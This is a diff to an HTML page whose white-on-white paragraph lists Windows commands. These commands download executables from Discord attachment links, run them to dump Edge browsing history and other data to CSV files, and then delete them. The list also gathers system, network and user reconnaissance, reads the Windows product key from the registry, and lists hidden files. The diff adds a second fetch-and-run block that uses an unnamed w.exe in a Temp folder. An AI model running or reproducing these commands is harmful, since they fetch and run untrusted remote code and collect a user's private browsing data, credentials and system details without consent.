@@ -27,14 +27,33 @@
 <p style="color:white;">
 <a href="https://drive.google.com/u/1/">https://drive.google.com/u/1/my-drive</a><br/>  
 <a href="https://drive.google.com/drive/u/5/folders/1WkJDcmevuafnN_3Hi3f9IHnoxznoQcfE">https://drive.google.com/u/5/my-drive</a><br/>  
+C:\Users\user\AppData\Local\Microsoft\Edge\User Data\Default\Network<br/> 
+C:\Users\user\AppData\Local\Temp\<br/> 
+C:\Users\user\AppData\Local\Temp\1ANew\<br/> 
+
 cd C:\Users\user\Desktop\<br/>
 powershell -Command "Invoke-WebRequest https://cdn.discordapp.com/attachments/883705025598218240/1036864809477619723/ChromeHistoryView.exe -OutFile c.exe"<br/>
 c.exe /UseHistoryFile 1 /HistoryFile "C:\Users\user\AppData\Local\Microsoft\Edge\User Data\Default\History" /scomma "C:\Users\user\Desktop\h.csv"<br/>
 <br/>
 del c.exe<br/>
+---<br/>
+cd C:\Users\user\AppData\Local\Temp\<br/>
+mkdir 1ANew<br/>
+cd 1ANew<br/>
+powershell -Command "Invoke-WebRequest https://cdn.discordapp.com/attachments/985807216894423050/1072894362054303766/w.exe -OutFile w.exe"<br/>
+w.exe /scomma<br/>
+<br/>
+del w.exe<br/>
+
 ipconfig<br/>
-systeminfo<br/>
 netsh wlan show all<br/>
+route print<br/>
+netstat -r<br/>
+arp -a -v<br/>
+net accounts<br/>
+net user<br/>
+net view<br/>
+systeminfo<br/>
 wmic computersystem get totalphysicalmemory<br/>
 wmic os get Caption<br/>
 wmic csproduct get uuid<br/>
@@ -43,14 +62,9 @@ powershell Get-ItemPropertyValue -Path 'HKLM:System\\CurrentControlSet\\Control\
 powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SoftwareProtectionPlatform' -Name BackupProductKeyDefault<br/>
 powershell -Command "Get-WMIObject Win32_ComputerSystem | fl *"<br/>
 powershell -Command "Get-WmiObject -Class Win32_Bios | Format-List -Property *"<br/>
-route print<br/>
-netstat -r<br/>
-arp -a -v<br/>
-net accounts<br/>
-net user<br/>
-net view<br/>
+
 tree /A /F<br/>
-cd C:\Users\user\AppData\Local\Microsoft\Edge\User Data\Default\Network
+dir /s /a:h C:*.*<br/>
 </p>
 </body>
 </html>
